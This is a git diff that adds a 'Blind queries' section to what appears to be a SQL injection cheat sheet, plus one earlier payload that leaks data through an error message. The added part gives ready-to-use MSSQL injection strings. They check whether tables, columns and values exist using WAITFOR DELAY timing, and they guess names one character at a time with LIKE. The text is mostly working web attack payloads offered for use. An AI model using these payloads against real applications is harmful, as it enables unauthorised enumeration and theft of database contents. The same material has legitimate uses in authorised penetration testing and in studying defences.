@@ -127,3 +127,48 @@ Insert the columns you need to read in the inner select, in this way it wil be p
 ```
 ');SELECT CAST (foo.col1 AS integer) FROM (SELECT ROW_NUMBER() OVER (ORDER BY id ASC) AS rownumber,<db>..<table>.<column> AS col1 FROM <db>..<table>) AS foo WHERE rownumber = <nth>;--
 ```
+
+### Blind queries
+
+Allows to retrieve information about the db structure and its contents by querying the db using boolean statements such as "does this table exists?" in combination with an error or time based query. In this way we can verify the result of query by checking if an error is returned or the execution is paused by the given time.
+
+Time based queries are your best bet because error strings may be intercepted by error control mechanisms on the backend while sleep instructions are executed as standard SQL instructions.
+
+These examples are written in MSSQL format with time based queries but can be easily converted in any SQL dialect.
+
+#### Generic query
+
+```
+'; IF (<statement>) <wait or error instruction>;--
+```
+
+#### Check if table exists
+
+```
+'; IF ((select count(name) from sys.tables where name = '<table>')=1) WAITFOR DELAY '0:0:10';--
+```
+
+#### Check if column exists
+
+```
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = '<table>' and c.name = '<column>')=1) WAITFOR DELAY '0:0:10';--
+```
+
+#### Check if value exists
+
+```
+'; IF ((select count(<column>) from <table> where <column> = '<value>')=1) WAITFOR DELAY '0:0:10';--
+```
+
+#### Guess values
+
+It is possible to discover a given value by using the like condition to check one character at time until we find the complete string. For example to find the user table we proceed as follows
+
+```
+'; IF ((select count(name) from sys.tables where name like 'u%')=1) ...
+'; IF ((select count(name) from sys.tables where name like 'us%')=1) ...
+'; IF ((select count(name) from sys.tables where name like 'use%')=1) ...
+'; IF ((select count(name) from sys.tables where name like 'user%')=1) ...
+```
+
+This technique can be applied to any object in the database including tables, column names and values
